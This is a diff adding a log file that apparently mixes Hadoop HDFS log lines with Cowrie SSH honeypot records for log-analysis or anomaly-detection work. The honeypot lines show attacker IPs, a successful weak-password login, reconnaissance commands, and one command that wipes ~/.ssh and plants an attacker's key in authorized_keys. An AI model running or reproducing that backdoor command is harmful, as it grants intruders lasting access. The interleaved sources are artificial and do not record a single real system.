@@ -1,0 +1,100 @@
+081109 203650 33 INFO dfs.FSNamesystem: BLOCK* NameSystem.addStoredBlock: blockMap updated: 10.251.214.130:50010 is added to blk_-5337994755640289830 size 67108864
+CMD: w
+081109 204755 13 INFO dfs.DataBlockScanner: Verification succeeded for blk_8277429727722645510
+081109 204212 409 INFO dfs.DataNode$DataXceiver: Receiving block blk_-6215051590034285968 src: /10.251.198.196:37226 dest: /10.251.198.196:50010
+081109 204701 620 INFO dfs.DataNode$PacketResponder: Received block blk_5769072448605493940 of size 67108864 from /10.250.14.224
+081109 203759 222 INFO dfs.DataNode$PacketResponder: PacketResponder 1 for block blk_-7558405665651817421 terminating
+081109 203622 34 INFO dfs.FSNamesystem: BLOCK* NameSystem.allocateBlock: /user/root/rand/_temporary/_task_200811092030_0001_m_000386_0/part-00386. blk_2013325748856732111
+SSH client hassh fingerprint: 51cba57125523ce4b9db67714a90bf6e
+081109 203752 32 INFO dfs.FSNamesystem: BLOCK* NameSystem.allocateBlock: /user/root/rand/_temporary/_task_200811092030_0001_m_000083_0/part-00083. blk_-2856491147308490440
+081109 204033 353 INFO dfs.DataNode$DataXceiver: Receiving block blk_-6683979881066583954 src: /10.251.194.129:57204 dest: /10.251.194.129:50010
+081109 204045 330 INFO dfs.DataNode$PacketResponder: PacketResponder 1 for block blk_666226369184845779 terminating
+cowrie.session.params src_ip=5.141.81.226 username=
+081109 203949 300 INFO dfs.DataNode$DataXceiver: Receiving block blk_7505495163819331501 src: /10.251.123.1:39554 dest: /10.251.123.1:50010
+Connection lost after 120 seconds
+081109 204754 614 INFO dfs.DataNode$DataXceiver: Receiving block blk_-1704356550921684323 src: /10.251.70.112:46348 dest: /10.251.70.112:50010
+081109 204042 338 INFO dfs.DataNode$DataXceiver: Receiving block blk_8074191249935269840 src: /10.250.10.176:33584 dest: /10.250.10.176:50010
+081109 203822 28 INFO dfs.FSNamesystem: BLOCK* NameSystem.addStoredBlock: blockMap updated: 10.250.19.227:50010 is added to blk_4966114407206237309 size 67108864
+081109 204110 32 INFO dfs.FSNamesystem: BLOCK* NameSystem.addStoredBlock: blockMap updated: 10.251.195.70:50010 is added to blk_-3681672541792013824 size 67108864
+cowrie.session.params src_ip=1.179.185.50 username=
+081109 204149 27 INFO dfs.FSNamesystem: BLOCK* NameSystem.addStoredBlock: blockMap updated: 10.251.111.228:50010 is added to blk_808913473644342835 size 67108864
+CMD: uname -a
+081109 204757 35 INFO dfs.FSNamesystem: BLOCK* NameSystem.addStoredBlock: blockMap updated: 10.251.203.4:50010 is added to blk_8993243400688409735 size 3538570
+081109 203628 152 INFO dfs.DataNode$PacketResponder: PacketResponder 2 for block blk_-8531310335568756456 terminating
+Closing TTY Log: var/lib/cowrie/tty/afd0dd76c8d59e416fec286d040e83826448034f3e0fe636494e348f908ff851 after 0 seconds
+081109 203654 199 INFO dfs.DataNode$DataXceiver: Receiving block blk_-2590057905078537066 src: /10.251.27.63:57895 dest: /10.251.27.63:50010
+081109 204216 382 INFO dfs.DataNode$PacketResponder: PacketResponder 1 for block blk_-944018919884549370 terminating
+081109 204111 344 INFO dfs.DataNode$PacketResponder: PacketResponder 1 for block blk_6881023549654865807 terminating
+CMD: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
+081109 204110 341 INFO dfs.DataNode$PacketResponder: PacketResponder 1 for block blk_7824672569069983415 terminating
+081109 204015 329 INFO dfs.DataNode$PacketResponder: Received block blk_8669216175735562689 of size 67108864 from /10.251.107.19
+081109 204326 413 INFO dfs.DataNode$PacketResponder: Received block blk_3708679726899046099 of size 67108864 from /10.251.107.242
+cowrie.session.params src_ip=77.54.53.88 username=
+081109 203532 186 INFO dfs.DataNode$DataXceiver: 10.251.39.179:50010 Served block blk_-3544583377289625738 to /10.250.10.100
+CMD: uname -m
+Closing TTY Log: var/lib/cowrie/tty/5c0be87ed7434d69005f8bbd84cad8ae6abfd49121b4aaeeb4c1f4a2e2987711 after 0 seconds
+081109 203736 226 INFO dfs.DataNode$PacketResponder: Received block blk_-5355223559069469409 of size 67108864 from /10.251.38.214
+cowrie.session.params src_ip=103.148.113.55 username=
+cowrie.session.params src_ip=139.99.169.120 username=
+Closing TTY Log: var/lib/cowrie/tty/ea82fe82924bbdcd34f9642d3e79470eefa35f2308a6d85ad9cadf20051f1b2d after 0 seconds
+081109 203539 223 INFO dfs.DataNode$DataXceiver: 10.250.11.100:50010 Served block blk_-3544583377289625738 to /10.250.15.67
+081109 204621 26 INFO dfs.FSNamesystem: BLOCK* NameSystem.addStoredBlock: blockMap updated: 10.251.203.179:50010 is added to blk_3584224065406961324 size 3542320
+CMD: uname -m
+081109 203729 30 INFO dfs.FSNamesystem: BLOCK* NameSystem.addStoredBlock: blockMap updated: 10.251.214.175:50010 is added to blk_3174751483965949562 size 67108864
+081109 204815 603 INFO dfs.DataNode$PacketResponder: Received block blk_8918440911006295945 of size 67108864 from /10.251.122.79
+081109 204700 577 INFO dfs.DataNode$PacketResponder: PacketResponder 1 for block blk_9097741862555430196 terminating
+SSH client hassh fingerprint: 51cba57125523ce4b9db67714a90bf6e
+081109 203540 232 INFO dfs.DataNode$DataXceiver: 10.251.197.226:50010 Served block blk_-3544583377289625738 to /10.251.127.47
+login attempt [oracle/abcdefgh] succeeded
+New connection: 89.78.143.247:41234 (10.0.0.4:9090) [session: ff3eb2d1dd24]
+CMD: uname -a
+081109 203849 255 INFO dfs.DataNode$PacketResponder: PacketResponder 0 for block blk_5018624663824385618 terminating
+081109 204819 603 INFO dfs.DataNode$PacketResponder: PacketResponder 0 for block blk_6795631356320163506 terminating
+Closing TTY Log: var/lib/cowrie/tty/a28dd0be4d71a20d853d1770a896f623b4558fd8f00a6e06cc489263029b66f0 after 0 seconds
+Remote SSH version: SSH-2.0-libssh-0.6.3
+081109 204052 30 INFO dfs.FSNamesystem: BLOCK* NameSystem.addStoredBlock: blockMap updated: 10.251.194.147:50010 is added to blk_1206297444059407272 size 67108864
+Closing TTY Log: var/lib/cowrie/tty/3f1f9a5db692d999bb3d576b5e9956a242136e961ff3f52ba6202b1254ccdb99 after 0 seconds
+081109 204703 589 INFO dfs.DataNode$PacketResponder: PacketResponder 0 for block blk_-317719746173129043 terminating
+081109 204156 34 INFO dfs.FSNamesystem: BLOCK* NameSystem.addStoredBlock: blockMap updated: 10.250.14.143:50010 is added to blk_8902874290653812711 size 67108864
+081109 204227 34 INFO dfs.FSNamesystem: BLOCK* NameSystem.allocateBlock: /user/root/rand/_temporary/_task_200811092030_0001_m_000169_0/part-00169. blk_3421714795444045164
+081109 203929 31 INFO dfs.FSNamesystem: BLOCK* NameSystem.addStoredBlock: blockMap updated: 10.251.107.98:50010 is added to blk_5570135251324647021 size 67108864
+081109 203846 30 INFO dfs.FSNamesystem: BLOCK* NameSystem.addStoredBlock: blockMap updated: 10.251.67.211:50010 is added to blk_8280162924437316474 size 67108864
+081109 203646 190 INFO dfs.DataNode$PacketResponder: Received block blk_-8991056407448381439 of size 67108864 from /10.251.199.86
+cowrie.session.params src_ip=161.35.24.136 username=
+081109 204023 338 INFO dfs.DataNode$DataXceiver: Receiving block blk_-6313868889309442755 src: /10.250.14.224:33507 dest: /10.250.14.224:50010
+Connection lost after 2 seconds
+Connection lost after 2 seconds
+081109 203720 222 INFO dfs.DataNode$DataXceiver: Receiving block blk_8750997530106786888 src: /10.251.194.245:45585 dest: /10.251.194.245:50010
+081109 204324 417 INFO dfs.DataNode$PacketResponder: Received block blk_-1507992907930766879 of size 67108864 from /10.251.30.134
+081109 204217 406 INFO dfs.DataNode$DataXceiver: Receiving block blk_4852227678728169541 src: /10.251.39.192:50919 dest: /10.251.39.192:50010
+081109 204056 27 INFO dfs.FSNamesystem: BLOCK* NameSystem.addStoredBlock: blockMap updated: 10.250.9.207:50010 is added to blk_4290408627270310959 size 67108864
+081109 204447 475 INFO dfs.DataNode$PacketResponder: PacketResponder 0 for block blk_8141808071445363675 terminating
+081109 204833 630 INFO dfs.DataNode$PacketResponder: PacketResponder 1 for block blk_9060189346543278218 terminating
+081109 204707 571 INFO dfs.DataNode$DataXceiver: Receiving block blk_8560241403245707155 src: /10.251.39.209:39448 dest: /10.251.39.209:50010
+081109 204300 27 INFO dfs.FSNamesystem: BLOCK* NameSystem.addStoredBlock: blockMap updated: 10.251.106.10:50010 is added to blk_3093127367153705019 size 67108864
+081109 204610 538 INFO dfs.DataNode$PacketResponder: Received block blk_8058817907505911891 of size 67108864 from /10.251.25.237
+cowrie.session.params src_ip=49.207.181.205 username=
+081109 204753 624 INFO dfs.DataNode$PacketResponder: Received block blk_1380111875952452943 of size 3553735 from /10.251.105.189
+081109 204726 579 INFO dfs.DataNode$PacketResponder: PacketResponder 0 for block blk_348548634648842426 terminating
+081109 203731 222 INFO dfs.DataNode$DataXceiver: Receiving block blk_9036962293154594303 src: /10.251.91.15:33440 dest: /10.251.91.15:50010
+cowrie.session.params src_ip=5.141.81.226 username=
+081109 204723 32 INFO dfs.FSNamesystem: BLOCK* NameSystem.addStoredBlock: blockMap updated: 10.250.13.240:50010 is added to blk_-973548644457446248 size 3536626
+Connection lost after 2 seconds
+081109 203911 266 INFO dfs.DataNode$PacketResponder: Received block blk_6268356033391750699 of size 67108864 from /10.251.201.204
+CMD: w
+081109 204008 322 INFO dfs.DataNode$DataXceiver: Receiving block blk_-4636159087827707811 src: /10.251.67.225:42120 dest: /10.251.67.225:50010
+081109 204519 511 INFO dfs.DataNode$DataXceiver: writeBlock blk_-4269455850074860629 received exception java.io.IOException: Could not read from stream
+081109 203607 151 INFO dfs.DataNode$PacketResponder: Received block blk_-105450231192318816 of size 67108864 from /10.251.31.180
+081109 203628 186 INFO dfs.DataNode$DataXceiver: Receiving block blk_-6262048896829045189 src: /10.251.201.204:39554 dest: /10.251.201.204:50010
+081109 203635 190 INFO dfs.DataNode$DataXceiver: Receiving block blk_6122321441386847083 src: /10.251.125.193:55002 dest: /10.251.125.193:50010
+Closing TTY Log: var/lib/cowrie/tty/cc1eb03e9b5926d8076e25826664a04400de854bf5cc660fa35eb86cbdf7dc0f after 0 seconds
+CMD: free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+081109 204457 507 INFO dfs.DataNode$DataXceiver: Receiving block blk_4927383458536835590 src: /10.251.126.83:33011 dest: /10.251.126.83:50010
+081109 204640 30 INFO dfs.FSNamesystem: BLOCK* NameSystem.allocateBlock: /user/root/rand/_temporary/_task_200811092030_0001_m_000317_0/part-00317. blk_8492663237969712909
+081109 203932 299 INFO dfs.DataNode$DataXceiver: Receiving block blk_8869736409186522879 src: /10.251.111.37:60518 dest: /10.251.111.37:50010
+081109 203932 275 INFO dfs.DataNode$PacketResponder: Received block blk_8498401613791720690 of size 67108864 from /10.251.39.192
+081109 204554 514 INFO dfs.DataNode$PacketResponder: PacketResponder 0 for block blk_7775703395393605750 terminating
+081109 204455 32 INFO dfs.FSNamesystem: BLOCK* NameSystem.addStoredBlock: blockMap updated: 10.251.107.98:50010 is added to blk_5853202594500111668 size 3542080
+081109 204435 317 INFO dfs.DataNode$PacketResponder: PacketResponder 0 for block blk_7505495163819331501 terminating
+CMD: top
+CMD: cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
